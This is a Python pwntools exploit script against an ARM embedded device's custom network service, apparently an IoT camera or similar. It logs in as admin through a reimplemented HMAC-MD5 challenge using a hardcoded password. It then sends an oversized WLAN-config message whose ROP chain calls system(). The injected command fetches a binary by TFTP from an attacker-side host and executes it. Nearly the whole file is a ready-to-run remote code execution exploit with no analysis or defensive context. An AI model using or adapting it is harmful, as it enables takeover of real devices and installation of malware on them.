from pwn import *
import socket
import hashlib
import base64

context.update(arch='arm', os='linux', endianness='big')


HOST = "10.42.0.106"                                    # The server's hostname or IP address
PORT = 8000                                             # The port used by the server
PASSWORD = b"GHNZZY"                                    # Passowrd/verification code
CMD = b"tftp -r x -g 10.42.0.1 9069;chmod +x x;./x\x00" # cmd to be executed (be sure to terminate with null)

def hamc_encrypt(input, challenge):
    k1 = b"\x36" * len(challenge)
    k2 = b"\x5c" * len(challenge)
    c1  = bytes(a^b for a,b in zip(challenge,k1))
    c1 += b"\x36" * (64 - len(c1))
    c2  = bytes(a^b for a,b in zip(challenge,k2))
    c2 += b"\x5c" * (64 - len(c2))
    # print("c1 :" + c1.hex())
    # print("c2 :" + c2.hex())
    m1 = hashlib.md5()
    m1.update(c1)
    m1.update(input)
    # print("m1 :" + m1.hexdigest())
    m2 = hashlib.md5()
    m2.update(c2)
    m2.update(m1.digest())
    print("Result :" + m2.hexdigest())

    return m2.digest()

def login(s, pwd):
    payload  = p32(24)              # size
    payload += p32(0x5a000000)      # ifVer
    payload += p32(0x01020304)      # ?
    payload += p32(0x10000)         # cmd
    payload += p32(0x040028c1)      # sdk version
    payload += p32(0x05050608)

    s.sendall(payload)
    data = s.recv(1024)
    challenge = base64.decodebytes(data[16:60])
    print(b"Challenge :" + challenge)
    print("Hashing credentials with challenge...")

    payload  = p32(0x00)
    payload += p32(0x00)
    payload += b"a" * 28
    payload += hamc_encrypt(b"admin", challenge) + b"\x00" * 16
    payload += hamc_encrypt(pwd, challenge) + b"\x00" * 16
    payload += b"a" * (92 - len(payload)) 

    s.sendall(payload)
    data = s.recv(1024)

    return int(data[16:20].hex(), 16)


print("Logging in as admin...")
user_id = 0

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    user_id = login(s, PASSWORD)

if user_id == 0:
    print("Failed to login")
    exit(1)

print("Logged in as admin")
print("User id: " + str(user_id))
print("Sending set wlan config payload")
    
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    
    content  = b"a" * 80
    content += p32(0)                   # ap mode
    content += p32(1)                   # security
    content += b"bbbb"              
    content += b"test1234"              # pwd
    content += p32(0)
    content += b"b" * 88
    content += p32(0xdeadbeef)          # r4
    content += p32(0xdeadbeef)          # r5
    content += p32(0xdeadbeef)          # r6
    content += p32(0xdeadbeef)          # r7
    content += p32(0xdeadbeef)          # r8
    content += p32(0xdeadbeef)          # r9
    content += p32(0xdeadbeef)          # r10
    content += p32(0xdeadbeef)          # r11
    content += p32(0x84591c00)          # pc(binary is le, invert this or the other numbers)
                                        # 0x001c5984 : add sp, 0x1e0 ; pop {r4-r8, pc} 
    content += b"c" * 32
    content += p32(0xde00beef)          # r4
    content += p32(0xdead00ef)          # r5
    content += p32(0xdeadbe00)          # r6
    content += p32(0x00adbeef)          # r7
    content += p32(0x78940000)          # r8: 0x00009478 system @ symbol table
    content += p32(0x30411b00)          # pc: 0x001b4130 : mov r0, sp ; mov lr, pc ; ldr pc, [r8]
    content += CMD   

    header  = p32(32 + len(content))    # cmd len
    header += p32(0x0)
    header += p32(0x0)
    header += p32(0x020142)             # cmd id
    header += p32(0x01002a0a)           # ip
    header += p32(user_id)              # user id
    header += p32(0x0)
    header += p32(0x0)

    s.sendall(header + content)
    # data = s.recv(1024)
    # print(data)